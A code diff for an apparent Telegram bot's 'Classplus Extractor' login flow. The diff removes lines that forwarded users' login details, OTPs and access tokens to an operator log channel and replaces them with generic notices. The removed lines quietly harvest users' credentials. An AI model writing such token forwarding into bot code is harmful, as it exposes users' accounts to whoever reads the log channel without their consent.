@@ -15,7 +15,6 @@ import re
 from config import PREMIUM_LOGS, join,BOT_TEXT
 from datetime import datetime
 import pytz
-from Extractor.core.utils import forward_to_log
 import base64
 from urllib.parse import urlparse, parse_qs
 
@@ -38,7 +37,7 @@ async def classplus_txt(app, message):
         "- <code>ABCD*9876543210</code>\n"
         "- <code>eyJhbGciOiJIUzI1NiIsInR5cCI6...</code>"
     )
-    await forward_to_log(details, "Classplus Extractor")
+    # Never forward submitted login details or access tokens to a log channel.
     user_input = details.text.strip()
 
     if "*" in user_input:
@@ -71,12 +70,10 @@ async def classplus_txt(app, message):
             }
              
             otp_response = s.post(f"{apiurl}/v2/otp/generate", json=otp_payload, headers=headers)
-            print(otp_response)
 
             if otp_response.status_code == 200:
                 otp_data = otp_response.json()
                 session_id = otp_data['data']['sessionId']
-                print(session_id)
 
                 # Step 4: Ask for OTP
                 user_otp = await app.ask(message.chat.id, 
@@ -88,7 +85,6 @@ async def classplus_txt(app, message):
 
                 if user_otp.text.isdigit():
                     otp = user_otp.text.strip()
-                    print(otp)
 
                     # Step 5: Verify OTP
                     fingerprint_id = str(uuid.uuid4()).replace('-', '')
@@ -116,11 +112,7 @@ async def classplus_txt(app, message):
                                 "🔑 <b>Your Access Token:</b>\n"
                                 f"<code>{token}</code>"
                             )
-                            await app.send_message(PREMIUM_LOGS, 
-                                "✅ <b>New Login Alert</b>\n\n"
-                                "🔑 <b>Access Token:</b>\n"
-                                f"<code>{token}</code>"
-                            )
+                            await app.send_message(PREMIUM_LOGS, "✅ <b>Classplus login succeeded.</b>")
                             
 
                             headers = {
@@ -167,7 +159,7 @@ async def classplus_txt(app, message):
                             s.headers['x-access-token'] = token
                         
                             await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
-                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
+                            await app.send_message(PREMIUM_LOGS, "✅ <b>Classplus login succeeded.</b>")
                     
                     elif verify_response.status_code == 409:
 
@@ -199,7 +191,7 @@ async def classplus_txt(app, message):
                             s.headers['x-access-token'] = token
                         
                             await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
-                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
+                            await app.send_message(PREMIUM_LOGS, "✅ <b>Classplus login succeeded.</b>")
                             
 
                             headers = {
@@ -248,7 +240,7 @@ async def classplus_txt(app, message):
                             s.headers['x-access-token'] = token
                         
                             await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
-                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
+                            await app.send_message(PREMIUM_LOGS, "✅ <b>Classplus login succeeded.</b>")
                             
 
                             headers = {
@@ -270,12 +262,11 @@ async def classplus_txt(app, message):
                 else:
                     await message.reply("Failed to generate OTP. Please check your details and try again.")
 
-        except Exception as e:
-            await message.reply(f"Error: {str(e)}")
+        except Exception:
+            await message.reply("Something went wrong while processing the login. Please check the details and try again.")
 
     elif len(user_input) > 20:
-        a = f"CLASSPLUS LOGIN SUCCESSFUL FOR\n\n<blockquote>`{user_input}`</blockquote>"
-        await app.send_message(PREMIUM_LOGS, a)
+        await app.send_message(PREMIUM_LOGS, "ℹ️ <b>Classplus token login requested.</b>")
         headers = {
             'x-access-token': user_input,
             'user-agent': 'Mobile-Android',
